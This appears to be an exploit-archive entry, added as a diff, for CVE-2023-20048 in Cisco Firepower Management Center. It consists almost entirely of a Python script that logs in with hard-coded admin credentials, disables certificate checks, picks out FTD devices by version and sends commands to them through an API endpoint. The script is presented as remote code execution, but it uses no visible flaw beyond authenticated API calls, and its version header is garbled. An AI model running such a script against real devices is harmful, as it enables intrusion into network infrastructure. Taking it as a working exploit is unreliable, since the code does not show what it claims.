@@ -1,0 +1,123 @@
+id: 39444
+date: 03/12/2024
+title: Cisco Firepower Management Center < 6.6.7.1 - Authenticated Remote Code Execute Exploit
+author: Abdualhadi khalifa
+cves: CVE-2023-20048
+
+# Exploit Title: [Cisco Firepower Management Center]
+# Exploit Author: [Abdualhadi khalifa](https://twitter.com/absholi_ly)
+# Version: [6.2.3.18", "6.4.0.16", "6.6.7.1]
+# CVE : [CVE-2023-20048]
+
+import requests
+import json
+
+# set the variables for the URL, username, and password for the FMC web services interface
+fmc_url = "https://fmc.example.com"
+fmc_user = "admin"
+fmc_pass = "cisco123"
+
+# create a requests session to handle cookies and certificate verification
+session = requests.Session()
+session.verify = False
+
+# send a POST request to the /api/fmc_platform/v1/auth/generatetoken endpoint to get the access token and refresh token
+token_url = fmc_url + "/api/fmc_platform/v1/auth/generatetoken"
+response = session.post(token_url, auth=(fmc_user, fmc_pass))
+
+# check the response status and extract the access token and refresh token from the response headers
+# set the access token as the authorization header for the subsequent requests
+try:
+    if response.status_code == 200:
+        access_token = response.headers["X-auth-access-token"]
+        refresh_token = response.headers["X-auth-refresh-token"]
+        session.headers["Authorization"] = access_token
+    else:
+        print("Failed to get tokens, status code: " + str(response.status_code))
+        exit()
+except Exception as e:
+    print(e)
+    exit()
+
+# set the variable for the domain id
+# change this to your domain id
+domain_id = "e276abec-e0f2-11e3-8169-6d9ed49b625f"
+
+# send a GET request to the /api/fmc_config/v1/domain/{DOMAIN_UUID}/devices/devicerecords endpoint to get the list of devices managed by FMC
+devices_url = fmc_url + "/api/fmc_config/v1/domain/" + domain_id + "/devices/devicerecords"
+response = session.get(devices_url)
+
+# check the response status and extract the data as a json object
+try:
+    if response.status_code == 200:
+        data = response.json()
+    else:
+        print("Failed to get devices, status code: " + str(response.status_code))
+        exit()
+except Exception as e:
+    print(e)
+    exit()
+
+# parse the data to get the list of device names and URLs
+devices = []
+for item in data["items"]:
+    device_name = item["name"]
+    device_url = item["links"]["self"]
+    devices.append((device_name, device_url))
+
+# loop through the list of devices and send a GET request to the URL of each device to get the device details
+for device in devices:
+    device_name, device_url = device
+    response = session.get(device_url)
+
+    # check the response status and extract the data as a json object
+    try:
+        if response.status_code == 200:
+            data = response.json()
+        else:
+            print("Failed to get device details, status code: " + str(response.status_code))
+            continue
+    except Exception as e:
+        print(e)
+        continue
+
+    # parse the data to get the device type, software version, and configuration URL
+    device_type = data["type"]
+    device_version = data["metadata"]["softwareVersion"]
+    config_url = data["metadata"]["configURL"]
+
+    # check if the device type is FTD and the software version is vulnerable to the CVE-2023-20048 vulnerability
+    # use the values from the affected products section in the security advisory
+    if device_type == "FTD" and device_version in ["6.2.3.18", "6.4.0.16", "6.6.7.1"]:
+        print("Device " + device_name + " is vulnerable to CVE-2023-20048")
+
+        # create a list of commands that you want to execute on the device
+        commands = ["show version", "show running-config", "show interfaces"]
+        device_id = device_url.split("/")[-1]
+
+        # loop through the list of commands and send a POST request to the /api/fmc_config/v1/domain/{DOMAIN_UUID}/devices/devicerecords/{DEVICE_ID}/operational/command/{COMMAND} endpoint to execute each command on the device
+        # replace {DOMAIN_UUID} with your domain id, {DEVICE_ID} with your device id, and {COMMAND} with the command you want to execute
+        for command in commands:
+            command_url = fmc_url + "/api/fmc_config/v1/domain/" + domain_id + "/devices/devicerecords/" + device_id + "/operational/command/" + command
+            response = session.post(command_url)
+
+            # check the response status and extract the data as a json object
+            try:
+                if response.status_code == 200:
+                    data = response.json()
+                else:
+                    print("Failed to execute command, status code: " + str(response.status_code))
+                    continue
+            except Exception as e:
+                print(e)
+                continue
+
+            # parse the data to get the result of the command execution and print it
+            result = data["result"]
+            print("Command: " + command)
+            print("Result: " + result)
+
+    else:
+        print("Device " + device_name + " is not vulnerable to CVE-2023-20048")
+
+#  0day.today [2024-03-15]  #
